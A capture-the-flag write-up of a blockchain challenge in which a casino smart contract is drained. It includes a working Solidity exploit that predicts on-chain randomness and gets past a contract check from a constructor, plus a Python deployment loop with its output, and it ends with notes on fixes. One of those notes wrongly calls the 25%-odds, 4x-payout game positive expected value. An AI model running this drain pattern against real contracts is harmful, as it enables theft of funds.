# NullCTF 2025 - We Go Gambling - Revenge Challenge Writeup

**Author:** xseven  
**Difficulty:** Easy  
**Category:** Blockchain  

## Challenge Description

Welcome to the Lucky Crypto Casino - Revenge!!!!! The premier destination for high-stakes gambling on the blockchain. Step right up, ladies and gentlemen, to the only place in the metaverse where fortune favors the bold!

Challenge URL: http://public.ctf.r0devnull.team:3013

## Intro

This blockchain challenge presents a smart contract-based casino game implemented on the Ethereum blockchain. The challenge consists of three main Solidity contracts:

1. **Setup.sol** - The deployment and initialization contract that sets up the challenge environment
2. **Coin.sol** - An ERC20 token contract called `LuckToken` (LUCK) used as the casino's currency
3. **Casino.sol** - The main casino contract that implements the gambling logic

The objective is to drain the casino's ETH balance below 1 ETH to solve the challenge. The casino starts with 100 ETH, and players can exchange ETH for LUCK tokens at a rate of 100 wei per token, play gambling games with those tokens, and exchange tokens back to ETH.

## Initial Analysis

### Setup Contract Analysis

The `Setup.sol` contract initializes the challenge:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coin.sol";
import "./Casino.sol";

contract Setup {
    LuckToken public token;
    Casino public casino;

    constructor() payable {
        require(msg.value == 100 ether, "Setup requires 100 Ether");

        token = new LuckToken();
        casino = new Casino(address(token));

        uint256 luckSupply = address(this).balance / 100;

        token.mint(address(this), luckSupply);
        token.transferOwnership(address(casino));
        token.transfer(address(casino), luckSupply);
        
        payable(address(casino)).transfer(address(this).balance);
    }

    function isSolved() external view returns (bool) {
        return address(casino).balance < 1 ether;
    }
}
```

**Key observations:**
- The Setup contract deploys both the token and casino contracts with 100 ETH
- It mints `100 ether / 100 = 1 ether` worth of LUCK tokens
- The casino receives both the tokens and all the ETH
- The challenge is solved when the casino's balance drops below 1 ETH

### LuckToken Contract Analysis

The `Coin.sol` contract is a standard ERC20 token with minting capability:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract LuckToken is ERC20, Ownable {
    constructor() ERC20("LuckToken", "LUCK") Ownable(msg.sender) {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
```

**Key observations:**
- Standard OpenZeppelin ERC20 implementation
- Has an `onlyOwner` mint function
- Ownership is transferred to the Casino contract during setup

### Casino Contract Analysis

The `Casino.sol` contract is where the vulnerability lies:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coin.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract Casino {
    LuckToken public token;
    uint256 public constant RATE = 100;

    event Won(address indexed player, uint256 amount);
    event Lost(address indexed player, uint256 amount);

    constructor(address _tokenAddress) {
        token = LuckToken(_tokenAddress);
    }

    receive() external payable {}

    function buyLuck() public payable {
        require(msg.value >= RATE, "Send at least 100 wei");
        uint256 luckAmount = msg.value / RATE;
        
        require(token.balanceOf(address(this)) >= luckAmount, "Casino has insufficient LUCK");
        token.transfer(msg.sender, luckAmount);
    }

    function sellLuck(uint256 amount) public {
        require(amount > 0, "Amount must be greater than 0");
        require(token.balanceOf(msg.sender) >= amount, "Insufficient balance");
        
        uint256 ethAmount = amount * RATE;
        require(address(this).balance >= ethAmount, "Casino has insufficient ETH liquidity");

        token.transferFrom(msg.sender, address(this), amount);

        payable(msg.sender).transfer(ethAmount);
    }

    function play(uint256 betAmount) public {
        require(msg.sender.code.length == 0, "Contracts are not allowed to play");
        require(token.balanceOf(msg.sender) >= betAmount, "Insufficient LUCK tokens");
        require(token.allowance(msg.sender, address(this)) >= betAmount, "Please approve tokens first");

        token.transferFrom(msg.sender, address(this), betAmount);

        uint256 random = uint256(keccak256(abi.encodePacked(
            block.timestamp, 
            block.prevrandao, 
            msg.sender
        ))) % 100;

        if (random < 25) {
            uint256 prize = betAmount * 4;
            require(token.balanceOf(address(this)) >= prize, "Casino cannot afford payout");
            token.transfer(msg.sender, prize);
            emit Won(msg.sender, prize);
        } else {
            emit Lost(msg.sender, betAmount);
        }
    }
}
```

**Key observations:**
- `buyLuck()`: Exchange ETH for LUCK tokens at 100 wei per token
- `sellLuck()`: Exchange LUCK tokens back to ETH at the same rate
- `play()`: Gambling function with a 25% win chance and 4x payout
- The contract checks `msg.sender.code.length == 0` to prevent contracts from playing

## Vulnerability Identification

The Casino contract has two critical vulnerabilities that can be combined to drain its funds:

### Vulnerability 1: Weak Random Number Generation

The `play()` function uses a predictable pseudo-random number generator (PRNG):

```solidity
uint256 random = uint256(keccak256(abi.encodePacked(
    block.timestamp, 
    block.prevrandao, 
    msg.sender
))) % 100;
```

**Why this is vulnerable:**
- `block.timestamp` and `block.prevrandao` are known values within the same block
- `msg.sender` is the address calling the function (predictable)
- All these values are deterministic and can be calculated in advance within the same transaction
- An attacker can pre-calculate the random value before executing the play

### Vulnerability 2: Bypassable Contract Detection

The contract attempts to prevent smart contracts from playing:

```solidity
require(msg.sender.code.length == 0, "Contracts are not allowed to play");
```

**Why this check is bypassable:**
- During contract construction (inside the constructor), the contract's code has not yet been stored at its address
- Therefore, `address(this).code.length` returns 0 during constructor execution
- An attacker can execute the entire attack from within a contract constructor

### Combined Attack Vector

By combining these two vulnerabilities:
1. Deploy an exploit contract that performs all actions in its constructor
2. Pre-calculate the random number using the same formula as the casino
3. Only proceed if the random number indicates a win (< 25)
4. If not, revert the transaction and try with a different address/nonce
5. Once a winning combination is found, execute the full attack:
   - Buy LUCK tokens with ETH
   - Play repeatedly (always winning due to consistent random value)
   - Accumulate massive token balance through exponential growth
   - Sell tokens back for ETH to drain the casino

## Exploitation

### Step 1: Create the Exploit Contract

Create `Exploit.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICasino {
    function buyLuck() external payable;
    function sellLuck(uint256 amount) external;
    function play(uint256 betAmount) external;
    function token() external view returns (address);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract Exploit {
    constructor(address payable _casino) payable {
        ICasino casino = ICasino(_casino);
        IERC20 token = IERC20(casino.token());

        // Pre-calculate random to ensure we win
        // The casino uses:
        // uint256 random = uint256(keccak256(abi.encodePacked(
        //    block.timestamp, 
        //    block.prevrandao, 
        //    msg.sender
        // ))) % 100;
        // Here msg.sender is address(this)
        
        uint256 random = uint256(keccak256(abi.encodePacked(
            block.timestamp, 
            block.prevrandao, 
            address(this)
        ))) % 100;

        // If we aren't going to win, revert to save gas/funds and try again with a new nonce/address
        require(random < 25, "Bad luck, try again");

        // 1. Buy LUCK
        uint256 initialEth = address(this).balance;
        require(initialEth > 0, "Need ETH to play");
        
        casino.buyLuck{value: initialEth}();
        
        // 2. Approve
        token.approve(address(casino), type(uint256).max);

        // 3. Play loop
        // We want to drain the casino's ETH.
        // We need enough tokens to sell for the ETH.
        // 1 Token = 100 Wei.
        
        while (address(casino).balance > 0) {
             uint256 myTokens = token.balanceOf(address(this));
             uint256 casinoTokens = token.balanceOf(address(casino));
             
             // If we have enough tokens to drain the ETH, stop playing and sell
             if (myTokens * 100 >= address(casino).balance) {
                 break;
             }

             // Bet amount
             // We can bet up to myTokens
             // But payout is 4x bet. Casino must have 4x bet.
             // So bet <= casinoTokens / 4
             
             uint256 bet = myTokens;
             if (bet > casinoTokens / 4) {
                 bet = casinoTokens / 4;
             }
             
             if (bet == 0) break;

             casino.play(bet);
        }

        // 4. Sell tokens
        uint256 tokensToSell = token.balanceOf(address(this));
        // Cap at casino balance
        uint256 maxEth = address(casino).balance;
        // ethAmount = amount * RATE (100)
        // amount = ethAmount / 100
        uint256 maxTokens = maxEth / 100;
        
        if (tokensToSell > maxTokens) {
            tokensToSell = maxTokens;
        }
        
        if (tokensToSell > 0) {
            casino.sellLuck(tokensToSell);
        }
        
        // 5. Return funds
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
```

**Exploit Contract Breakdown:**

1. **Random Pre-calculation**: The constructor calculates the exact random value that the casino will generate
2. **Luck Check**: If the random value is >= 25 (losing), the transaction reverts immediately
3. **Buy Phase**: Convert ETH to LUCK tokens at 100 wei per token
4. **Approve**: Give unlimited approval to the casino to spend our tokens
5. **Play Loop**: Repeatedly bet and win (since random is consistent), growing our token balance exponentially
6. **Sell Phase**: Convert accumulated tokens back to ETH, draining the casino
7. **Return Funds**: Send all gained ETH back to the deployer

### Step 2: Create the Python Exploit Script

Create `solve.py`:

```python
import time
import sys
from web3 import Web3
from solcx import compile_source, install_solc

def solve():
    if len(sys.argv) < 4:
        print("Usage: python3 solve.py <RPC_URL> <PRIVATE_KEY> <SETUP_ADDRESS>")
        print("Example: python3 solve.py http://... 0x... 0x...")
        return

    rpc_url = sys.argv[1]
    private_key = sys.argv[2]
    setup_address = sys.argv[3]

    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if not w3.is_connected():
        print("Failed to connect to RPC")
        return

    account = w3.eth.account.from_key(private_key)
    print(f"Attacker address: {account.address}")
    print(f"Balance: {w3.eth.get_balance(account.address)}")

    # Compile Exploit.sol
    print("Compiling Exploit.sol...")
    try:
        install_solc('0.8.20')
    except Exception as e:
        print(f"Error installing solc: {e}")
        # Try continuing if already installed
    
    with open('Exploit.sol', 'r') as f:
        source = f.read()
    
    compiled = compile_source(
        source,
        output_values=['abi', 'bin'],
        solc_version='0.8.20'
    )
    
    contract_id, contract_interface = list(compiled.items())[0]
    bytecode = contract_interface['bin']
    abi = contract_interface['abi']

    # Get Casino address from Setup
    setup_abi = [
        {
            "inputs": [],
            "name": "casino",
            "outputs": [{"internalType": "contract Casino", "name": "", "type": "address"}],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "isSolved",
            "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "view",
            "type": "function"
        }
    ]
    
    setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi)
    casino_address = setup_contract.functions.casino().call()
    print(f"Casino address: {casino_address}")

    # Deploy Exploit loop
    Exploit = w3.eth.contract(abi=abi, bytecode=bytecode)
    
    print("Attempting to exploit...")
    
    while True:
        if setup_contract.functions.isSolved().call():
            print("SOLVED!")
            break
            
        # We need to send some ETH to buy luck.
        value_to_send = w3.to_wei(0.1, 'ether')
        
        nonce = w3.eth.get_transaction_count(account.address)
        
        try:
            print(f"Trying nonce {nonce}...")
            tx = Exploit.constructor(casino_address).build_transaction({
                'from': account.address,
                'nonce': nonce,
                'value': value_to_send,
                'gas': 5000000,
                'gasPrice': w3.eth.gas_price
            })
            
            signed_tx = w3.eth.account.sign_transaction(tx, private_key)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            print(f"Sent tx: {tx_hash.hex()}")
            
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 1:
                print("Exploit executed successfully!")
                break
            else:
                print("Tx reverted (bad luck), retrying...")
                
        except Exception as e:
            print(f"Error: {e}")
            print("Retrying...")
            time.sleep(1)

if __name__ == "__main__":
    solve()
```

**Script Breakdown:**

1. **Connection**: Connects to the provided RPC endpoint
2. **Compilation**: Compiles the Exploit.sol contract using py-solc-x
3. **Setup Query**: Retrieves the casino address from the Setup contract
4. **Deploy Loop**: Repeatedly attempts to deploy the exploit contract
5. **Nonce Iteration**: Each deployment uses a new nonce, generating a new contract address
6. **Success Detection**: Checks if the transaction succeeded or reverted
7. **Verification**: Confirms the challenge is solved via `isSolved()`

### Step 3: Execute the Exploit

1. Launch an instance on the challenge website to get credentials:
   - RPC URL: `http://public.ctf.r0devnull.team:3013/118ce9b9-85eb-4f54-8bef-59e9d97b15c5`
   - Private Key: `543206950cfca0e0f342c21606a353552662ec33d972862d0970f3ac3179a5ae`
   - Setup Address: `0xad9E7b1D3BfAA72010f50220DaF7A337f2D83fb5`
   - Wallet Address: `0x31D6a69fc4CE154Eb1Ea76141D18dfd0b6060B52`

2. Run the exploit script:

```bash
python3 solve.py "http://public.ctf.r0devnull.team:3013/118ce9b9-85eb-4f54-8bef-59e9d97b15c5" "543206950cfca0e0f342c21606a353552662ec33d972862d0970f3ac3179a5ae" "0xad9E7b1D3BfAA72010f50220DaF7A337f2D83fb5"
```

### Execution Output

```
Attacker address: 0x31D6a69fc4CE154Eb1Ea76141D18dfd0b6060B52
Balance: 2000000000000000000
Compiling Exploit.sol...
Casino address: 0xEB3C60f73DD9432349d9D5d151AbA7e726B8B8f2
Attempting to exploit...
Trying nonce 0...
Sent tx: 8c050e788174b85a7b90b92209b14d303799cf2e69479867864fcd023c18a0ac
Tx reverted (bad luck), retrying...
Trying nonce 1...
Sent tx: 405128dd4c7df82651f8c6af77b0e809aa4076d444f178d007313bc45c5cbcde
Tx reverted (bad luck), retrying...
Trying nonce 2...
Sent tx: a2a8aed2c3c1112161e7befb8e36bfb7b954d4fae4e06a7b9dcdc584cd2a703a
Tx reverted (bad luck), retrying...
Trying nonce 3...
Sent tx: dd288165e2325f5c1415e243bfc58be3449567b8f6892782671f7483422f3c15
Exploit executed successfully!
```

Verify the solution:

```bash
python3 solve.py "http://public.ctf.r0devnull.team:3013/118ce9b9-85eb-4f54-8bef-59e9d97b15c5" "543206950cfca0e0f342c21606a353552662ec33d972862d0970f3ac3179a5ae" "0xad9E7b1D3BfAA72010f50220DaF7A337f2D83fb5"
```

Output:
```
Attacker address: 0x31D6a69fc4CE154Eb1Ea76141D18dfd0b6060B52
Balance: 101898645846999999700
Compiling Exploit.sol...
Casino address: 0xEB3C60f73DD9432349d9D5d151AbA7e726B8B8f2
Attempting to exploit...
SOLVED!
```

**Explanation of the output:**
- The script tried nonces 0, 1, and 2 but the transactions reverted (random >= 25)
- On nonce 3, the random value was < 25, so the exploit succeeded
- The attacker's balance increased from 2 ETH to ~101.9 ETH (gained ~99.9 ETH from the casino)
- The casino's balance dropped below 1 ETH, solving the challenge

## Flag

After successfully draining the casino, retrieve the flag from the challenge website:

**Flag:** `nullctf{0ps_i_m3ss3d_up_sh0uld_b3_0k_n0w_ty}`

## Further notes

### 1. Never Use Predictable Randomness in Smart Contracts

The casino's PRNG is completely predictable because:
- `block.timestamp` and `block.prevrandao` are public blockchain data
- Miners/validators can manipulate these values
- Anyone can calculate the result before submitting a transaction

**Proper solutions:**
- Use Chainlink VRF (Verifiable Random Function) for provably fair randomness
- Use commit-reveal schemes with off-chain entropy
- Implement time-delayed randomness with multiple participants

### 2. Constructor-Based Contract Detection is Insufficient

Checking `address.code.length == 0` fails during contract construction:
- The code is deployed AFTER the constructor finishes
- Attackers can execute arbitrary logic in the constructor

**Better approaches:**
- Use `tx.origin != msg.sender` (with caution, as this has its own issues)
- Accept that smart contracts can interact with your contract and design accordingly
- Implement proper access controls and rate limiting
- Use commit-reveal patterns to prevent front-running and manipulation

### 3. Economic Security Design

The casino's economic model is flawed:
- The 4x payout with 25% win chance creates a positive expected value for attackers
- No safeguards against rapid repeated plays
- No time delays or cooling-off periods

**Better design:**
- Ensure the house always has a statistical edge
- Implement rate limiting and betting caps
- Add time delays between plays
- Monitor for unusual patterns and halt suspicious activity

## Conclusion

This challenge demonstrates fundamental vulnerabilities in smart contract security:
1. **Weak randomness** using predictable on-chain data
2. **Bypassable access controls** via constructor execution
3. **Exploitable game theory** through consistent random values within a transaction

The exploit successfully drained the casino by combining these vulnerabilities: deploying a contract that pre-calculates winning conditions, bypasses the contract check via constructor execution, and leverages the predictable randomness to win every play within a single transaction.

This is a common pattern in real-world blockchain security incidents, emphasizing the critical importance of proper randomness generation and understanding the Ethereum execution model when implementing access controls.

Pwned!

KOREONE
